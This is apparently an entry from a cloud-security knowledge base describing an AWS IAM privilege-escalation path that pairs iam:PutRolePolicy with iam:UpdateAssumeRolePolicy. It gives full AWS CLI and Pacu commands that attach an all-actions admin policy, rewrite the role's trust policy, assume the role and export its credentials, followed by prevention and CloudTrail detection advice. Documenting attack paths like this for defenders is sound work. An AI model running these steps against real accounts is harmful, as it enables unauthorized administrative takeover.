id: iam-021
name: iam:PutRolePolicy + iam:UpdateAssumeRolePolicy
category: principal-access
services:
- iam
permissions:
  required:
  - permission: iam:PutRolePolicy
    resourceConstraints: Must have access to add inline policies to the target role
  - permission: iam:UpdateAssumeRolePolicy
    resourceConstraints: Must have permission to modify the trust policy of the target
      role
  additional:
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles to target
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing current role trust policies and attached
      permissions
  - permission: iam:ListRolePolicies
    resourceConstraints: Helpful for viewing current inline policies on the target
      role
  - permission: iam:GetRolePolicy
    resourceConstraints: Useful for retrieving and examining the content of existing
      inline policies
description: 'A principal with `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy`
  can achieve privilege escalation by first adding an inline policy with administrative
  permissions to a target role, then modifying that role''s trust policy to allow
  the attacker to assume it. The key insight is that when a principal is explicitly
  named in a role''s trust policy, that principal can assume the role without needing
  separate `sts:AssumeRole` permissions - the trust policy itself grants this capability.
  This attack is often overlooked because each permission appears innocuous when evaluated
  separately: `iam:PutRolePolicy` seems like a reasonable permission for managing
  role permissions, and `iam:UpdateAssumeRolePolicy` seems reasonable for managing
  trust relationships. However, when combined, they create a complete privilege escalation
  path.'
prerequisites:
  admin:
  - A target IAM role must exist that you have both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy`
    permissions on
  lateral:
  - A target IAM role must exist that you have both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy`
    permissions on
exploitationSteps:
  awscli:
  - step: 1
    command: '# Set the target role name

      TARGET_ROLE="target-role-name"

      '
    description: Define the target role that will be modified and assumed
  - step: 2
    command: "# Create an admin policy document\ncat > admin-policy.json <<EOF\n{\n\
      \  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\"\
      : \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n \
      \ ]\n}\nEOF\n"
    description: Create a policy document with administrative permissions (all actions
      on all resources)
  - step: 3
    command: "# Add the admin inline policy to the target role\naws iam put-role-policy\
      \ \\\n  --role-name $TARGET_ROLE \\\n  --policy-name AdminEscalation \\\n  --policy-document\
      \ file://admin-policy.json\n"
    description: Add the administrative inline policy to the target role using iam:PutRolePolicy
  - step: 4
    command: '# Wait for IAM policy changes to propagate (15 seconds)

      sleep 15

      '
    description: Wait for the inline policy to propagate across AWS infrastructure
  - step: 5
    command: '# Get your current principal ARN

      CURRENT_ARN=$(aws sts get-caller-identity --query Arn --output text)

      echo "Current principal ARN: $CURRENT_ARN"

      '
    description: Retrieve your current principal ARN to add to the trust policy
  - step: 6
    command: "# Get the account ID\nACCOUNT_ID=$(aws sts get-caller-identity --query\
      \ Account --output text)\n\n# Create a new trust policy that includes your principal\n\
      cat > trust-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\"\
      : [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"\
      AWS\": \"$CURRENT_ARN\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n  \
      \  }\n  ]\n}\nEOF\n"
    description: Create a new trust policy document that explicitly allows your principal
      to assume the role
  - step: 7
    command: "# Update the role's trust policy\naws iam update-assume-role-policy\
      \ \\\n  --role-name $TARGET_ROLE \\\n  --policy-document file://trust-policy.json\n"
    description: Update the role's trust policy using iam:UpdateAssumeRolePolicy to
      allow your principal to assume it
  - step: 8
    command: '# Wait for trust policy changes to propagate (15 seconds)

      sleep 15

      '
    description: Wait for the trust policy to propagate across AWS infrastructure
  - step: 9
    command: "# Assume the role (no prior sts:AssumeRole permission needed)\nCREDENTIALS=$(aws\
      \ sts assume-role \\\n  --role-arn \"arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE\"\
      \ \\\n  --role-session-name privileged-session \\\n  --output json)\n\n# Extract\
      \ the temporary credentials\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS |\
      \ jq -r '.Credentials.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS\
      \ | jq -r '.Credentials.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS\
      \ | jq -r '.Credentials.SessionToken')\n"
    description: Assume the role using sts:AssumeRole. Note that no prior sts:AssumeRole
      permission is needed because the trust policy grants this capability automatically
      when a principal is explicitly named.
  - step: 10
    command: '# Verify administrative access using the assumed role credentials

      aws iam list-users --max-items 5

      '
    description: Verify that you now have administrative access by listing IAM users
      with the assumed role credentials
  pacu:
  - step: 1
    command: '# Use Pacu to add an admin inline policy to the target role

      run iam__put_role_policy --role-name target-role-name --policy-name AdminEscalation
      --policy-document ''{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}''

      '
    description: Use Pacu to add an administrative inline policy to the target role
  - step: 2
    command: '# Use Pacu to update the role''s trust policy

      run iam__update_assume_role_policy --role-name target-role-name --principal-arn
      YOUR_PRINCIPAL_ARN

      '
    description: Use Pacu to update the role's trust policy to allow your principal
      to assume it
  - step: 3
    command: '# Use Pacu to assume the role

      run sts__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role-name

      '
    description: Use Pacu to assume the role and obtain temporary credentials with
      administrative permissions
limitations: 'This attack provides administrative access because the attacker controls
  the inline policy document content. Unlike `iam:AttachRolePolicy` (which requires
  choosing from existing managed policies), `iam:PutRolePolicy` allows the attacker
  to embed any policy document directly into the role, guaranteeing administrative
  permissions regardless of what policies exist in the environment.

  '
recommendation: "Restrict `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` using\
  \ the principle of least privilege. These permissions should rarely be granted together\
  \ on the same target role, as this combination creates a direct privilege escalation\
  \ path.\n\n**Prevention strategies:**\n\n1. Restrict `iam:PutRolePolicy` to prevent\
  \ inline policy modification on sensitive roles:\n```json\n{\n  \"Effect\": \"Allow\"\
  ,\n  \"Action\": \"iam:PutRolePolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/non-sensitive-prefix-*\"\
  ,\n  \"Condition\": {\n    \"StringNotLike\": {\n      \"iam:RoleName\": [\"admin-*\"\
  , \"privileged-*\"]\n    }\n  }\n}\n```\n\n2. Restrict `iam:UpdateAssumeRolePolicy`\
  \ to prevent trust policy modification on sensitive roles:\n```json\n{\n  \"Effect\"\
  : \"Allow\",\n  \"Action\": \"iam:UpdateAssumeRolePolicy\",\n  \"Resource\": \"\
  arn:aws:iam::ACCOUNT:role/non-sensitive-prefix-*\",\n  \"Condition\": {\n    \"\
  StringNotLike\": {\n      \"iam:RoleName\": [\"admin-*\", \"privileged-*\"]\n  \
  \  }\n  }\n}\n```\n\n3. Use IAM permissions boundaries to limit the maximum permissions\
  \ a role can have, even if administrative inline policies are added\n\n4. Separate\
  \ the permissions - avoid granting both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy`\
  \ to the same principal for the same target roles\n\n5. Require MFA for sensitive\
  \ trust policy modifications and inline policy operations\n\n6. Implement regular\
  \ audits of role trust policies and inline policies, as both can be less visible\
  \ than managed policies in standard IAM reviews\n\n7. Use Service Control Policies\
  \ (SCPs) to prevent the addition of overly permissive inline policies or trust policy\
  \ modifications on critical roles\n\n8. Implement deny policies that explicitly\
  \ block modification of trust policies or inline policies on administrative or critical\
  \ roles\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event\
  \ patterns:\n- `PutRolePolicy` API calls with policy documents containing broad\
  \ permissions (e.g., `\"Action\": \"*\"` or `\"Action\": \"iam:*\"`)\n- `UpdateAssumeRolePolicy`\
  \ API calls that add new principals to trust policies\n- Sequential occurrences\
  \ of `PutRolePolicy` followed by `UpdateAssumeRolePolicy` on the same role within\
  \ a short time window\n- `AssumeRole` API calls immediately following `UpdateAssumeRolePolicy`\
  \ events\n- Trust policy modifications that add specific principal ARNs (as opposed\
  \ to service principals like `ec2.amazonaws.com`)\n\nSet up CloudWatch alarms for\
  \ unexpected changes to role trust policies and inline role policies. Investigate\
  \ any trust policy modifications combined with inline policy additions. Consider\
  \ implementing automated responses to roll back suspicious changes to critical role\
  \ trust policies or inline policies.\n"
